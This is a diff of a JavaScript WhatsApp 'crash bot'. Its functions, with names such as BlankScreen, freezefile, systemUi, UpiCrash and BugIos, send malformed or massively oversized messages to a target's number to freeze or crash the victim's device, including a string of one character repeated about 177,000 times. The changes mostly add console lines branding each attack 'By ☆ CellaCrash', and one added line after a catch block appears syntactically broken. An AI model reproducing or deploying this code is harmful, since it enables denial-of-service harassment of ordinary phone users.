@@ -1261,7 +1261,8 @@ bot.command("status", ctx => {
                         }
                     }
                 }
-            }, { participant: { jid: target } });            
+            }, { participant: { jid: target } });
+            console.log(chalk.red.bold('Lock System Device By ☆ CellaCrash'))   
         };
   async function f10(target, Ptcp = false) {
     await cella.relayMessage(target, {
@@ -1433,6 +1434,7 @@ async function XeonXRobust(target, Ptcp = true) {
       jid: target
     }
   } : {});
+  console.log(chalk.blue.bold('XeonXRobust Device By ☆ CellaCrash'))
 }
         async function thunderblast_doc(target) {
     const messagePayload = {
@@ -1573,6 +1575,7 @@ async function XeonXRobust(target, Ptcp = true) {
     };
 
     cella.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
+    console.log(chalk.yellow.bold('ThunderBlast Device By ☆ CellaCrash'))
 }
  async function BlankScreen(target, Ptcp = false) {
 let virtex = "Wanna With Yours :D " + "ྫྷ".repeat(77777) + "ྫྷ".repeat(100000);
@@ -1641,7 +1644,7 @@ let virtex = "Wanna With Yours :D " + "ྫྷ".repeat(77777) + "ྫྷ".repeat(100000)
 					}
 				} : {}
 			);
-            console.log(chalk.red.bold('Nandemo'))
+            console.log(chalk.red.bold('Blank Screen'))
    	};
 async function freezefile(target, QBug, Ptcp = true) {
     let virtex = "Wanna With Yours :D " + "ြ".repeat(200000);
@@ -1678,6 +1681,7 @@ async function freezefile(target, QBug, Ptcp = true) {
             }
         }
     }, { participant: { jid: target } }, { messageId: null });
+    console.log(chalk.white.bold('Freezefile Device By ☆ CellaCrash'))
 }
 async function thunderblast_notif(target) {
 			await cella.relayMessage(target, {
@@ -1746,6 +1750,7 @@ async function thunderblast_notif(target) {
 					}
 				}
 			);
+			console.log(chalk.blue.bold('Crash Device By ☆ CellaCrash'))
 		};
 async function systemUi(target, Ptcp = false) {
    await cella.relayMessage(target, {
@@ -1771,6 +1776,7 @@ async function systemUi(target, Ptcp = false) {
             }
         }
     }, { participant: { jid: target, quoted: QBug } }, { messageId: null });
+    console.log(chalk.red.bold('Crash System Ui By ☆ CellaCrash'))
 };
 	async function crashui2(target, ptcp = false) {
     await cella.relayMessage(target, {
@@ -1796,6 +1802,7 @@ async function systemUi(target, Ptcp = false) {
             }
         }
     }, { participant: { jid: target } }, { messageId: null });
+    console.log(chalk.red.bold('Crash System Ui2 By ☆ CellaCrash'))
 }
 //bug ios
 async function UpiCrash(target) {
@@ -1813,6 +1820,7 @@ async function UpiCrash(target) {
           },
         }
       );
+      console.log(chalk.blue.bold('UPICrash By ☆ CellaCrash'))
     }
 
     async function VenCrash(target) {
@@ -1830,6 +1838,7 @@ async function UpiCrash(target) {
           },
         }
       );
+      console.log(chalk.red.bold('VenSystem Device By ☆ CellaCrash'))
     }
 
     async function AppXCrash(target) {
@@ -1847,6 +1856,7 @@ async function UpiCrash(target) {
           },
         }
       );
+      console.log(chalk.red.bold('Crash App By ☆ CellaCrash'))
     }
 
     async function SmCrash(target) {
@@ -1864,6 +1874,7 @@ async function UpiCrash(target) {
           },
         }
       );
+      console.log(chalk.red.bold('SMCrash By ☆ CellaCrash'))
     }
 
 async function newsLetter(target) {
@@ -1887,7 +1898,8 @@ async function newsLetter(target) {
             }
             catch (err) {
                 console.log(err);
-            }
+            },
+            console.log(chalk.red.bold('Crash NewsLetter By ☆ CellaCrash'))
         }
 
     async function SqCrash(target) {
@@ -1905,6 +1917,7 @@ async function newsLetter(target) {
           },
         }
       );
+      console.log(chalk.red.bold('SQCrash By ☆ CellaCrash'))
     }
 
     async function FBiphone(target) {
@@ -1922,6 +1935,7 @@ async function newsLetter(target) {
           },
         }
       );
+      console.log(chalk.red.bold('CVirFB By ☆ CellaCrash'))
     }
 
     async function QXIphone(target) {
@@ -1942,6 +1956,7 @@ async function newsLetter(target) {
           },
         }
       );
+      console.log(chalk.red.bold('QXIphon By ☆ CellaCrash'))
     }
 
     async function QPayIos(target) {
@@ -1959,6 +1974,7 @@ async function newsLetter(target) {
           },
         }
       );
+      console.log(chalk.blue.bold('QPAY By ☆ CellaCrash'))
     }
 
     async function QPayStriep(target) {
@@ -1976,6 +1992,7 @@ async function newsLetter(target) {
           },
         }
       );
+      console.log(chalk.blue.bold('QPAY2 By ☆ CellaCrash'))
     }
 
     async function QDIphone(target) {
@@ -2013,6 +2030,7 @@ async function newsLetter(target) {
           messageId: null,
         }
       );
+      console.log(chalk.blue.bold('QDIP By ☆ CellaCrash'))
     }
     
     
@@ -2036,6 +2054,7 @@ async function newsLetter(target) {
     messageId: null,
     }
     );
+    console.log(chalk.red.bold('BugCTF By ☆ CellaCrash'))
 }
     
     async function bugPoll(target) {
@@ -2059,6 +2078,7 @@ async function newsLetter(target) {
     messageId: null,
     }
     );
+    console.log(chalk.red.bold('BugPoll By ☆ CellaCrash'))
 }
 
 async function bugTemplate(target) {
@@ -2082,10 +2102,8 @@ async function bugTemplate(target) {
     messageId: null,
     }
     );
+    console.log(chalk.red.bold('BugButton By ☆ CellaCrash'))
 }
-
-
-
     //
 
     async function IosMJ(target, Ptcp = false) {
@@ -2193,6 +2211,7 @@ async function bugTemplate(target) {
             }
           : {}
       );
+      console.log(chalk.red.bold('IOSMJ By ☆ CellaCrash'))
     }
 
     //
@@ -2227,7 +2246,9 @@ async function bugTemplate(target) {
           messageId: null,
         }
       );
+      console.log(chalk.red.bold('XIosVirus By ☆ CellaCrash'))
     }
+    
     async function BugIos(target) {
       for (let i = 0; i < 15; i++) {
         await IosMJ(target, true);
